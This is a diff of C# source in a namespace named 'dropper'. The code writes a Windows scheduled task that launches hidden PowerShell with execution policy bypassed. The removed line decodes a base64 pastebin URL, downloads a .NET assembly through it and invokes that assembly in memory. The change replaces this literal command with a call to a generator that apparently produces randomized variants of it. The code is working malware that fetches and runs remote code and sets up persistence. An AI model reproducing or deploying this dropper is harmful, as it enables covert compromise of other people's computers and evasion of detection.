@@ -67,7 +67,7 @@ namespace dropper
   <Actions Context=""Author"">
     <Exec>
       <Command>powershell.exe</Command>
-      <Arguments>-noprofile -executionpolicy bypass -windowstyle hidden -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData([System.Text.Encoding]::UTF8.GetString($wc.DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0xMcXhXN01C')))));$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('" + args[0] + @"', '" + args[1] + @"', '" + args[2] + @"')))</Arguments>
+      <Arguments>" + PGen.GenerateCommand(args[0], args[1], args[2], new Random()) + @"</Arguments>
     </Exec>
   </Actions>
 </Task>");
